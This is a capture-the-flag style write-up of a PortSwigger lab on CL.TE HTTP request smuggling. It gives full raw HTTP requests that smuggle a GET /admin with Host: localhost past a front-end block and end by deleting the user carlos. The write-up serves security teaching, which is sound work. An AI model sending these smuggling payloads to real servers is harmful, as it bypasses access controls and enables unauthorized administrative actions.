#  Exploiting HTTP - request smuggling to bypass front-end security controls, CL.TE vulnerability

## 📌 Lab Details
- **Title**: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
- **Difficulty**: Practitioner
- **Category**: HTTP Request Smuggling
- **Lab URL**: https://portswigger.net/academy/labs/launch/d87789adec7383329012f5a094910fc21a7bf4958acf05f883ac78ddd12c6a37?referrer=%2fweb-security%2frequest-smuggling%2fexploiting%2flab-bypass-front-end-controls-cl-te

## 🔍 Summary
This lab exploited a **CL.TE vulnerability**, where the **front-end server uses** `Content-Length` but the **back-end uses** `Transfer-Encoding`. By crafting a request with `Transfer-Encoding: chunked` and ending it with `0\r\n\r\n`, we smuggled a hidden `GET /admin` request (with `Host: localhost`) directly to the back-end, bypassing the front-end’s `/admin` block.

## 🛠 Steps to Solve
1. Try to visit `/admin` and observe that the request is blocked.
2. Using the **Burp Repeater**, issue the following request twice:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 37
   Transfer-Encoding: chunked

   0

   GET /admin HTTP/1.1
   X-Ignore: X
   ```
3. Observe that the merged request to `/admin` was rejected due to not using the header `Host: localhost`.
4. Issue the following request twice:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 54
   Transfer-Encoding: chunked

   0

   GET /admin HTTP/1.1
   Host: localhost
   X-Ignore: X
   ```
5. Observe that the request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request.
6. Issue the following request twice so the second request's headers are appended to the smuggled request body instead:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 116
   Transfer-Encoding: chunked

   0

   GET /admin HTTP/1.1
   Host: localhost
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 10

   x=
   ```
7. Observe that you can now access the admin panel.
8. Using the previous response as a reference, change the smuggled request URL to delete carlos:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 139
   Transfer-Encoding: chunked

   0

   GET /admin/delete?username=carlos HTTP/1.1
   Host: localhost
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 10

   x=
   ```

## 📖 Key Takeaways
- **CL.TE vulnerability**: Front-end uses Content-Length, back-end uses Transfer-Encoding.
- **Front-end filters** can be bypassed by smuggling requests directly to the back-end.
- Avoid duplicate header errors by **pushing the second request’s headers into the smuggled body**.
- Always set `Host: localhost` when the back-end restricts access to certain hosts.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/480e34ad-8613-4b96-8344-ac7bd471f797" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/908c0f01-cebf-466b-9d65-7332730fdcb6" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/73cf3215-2030-41e0-b94b-4b5244569c9e" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0e1d6586-b620-40a2-94b6-1efed53adcc8" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/acf136f0-da24-48f3-8280-8dc586bd5faf" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3eacef8f-77fe-4a84-9c0a-52362839b966" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/398d3cd3-4761-4514-b67d-6f476e414734" />
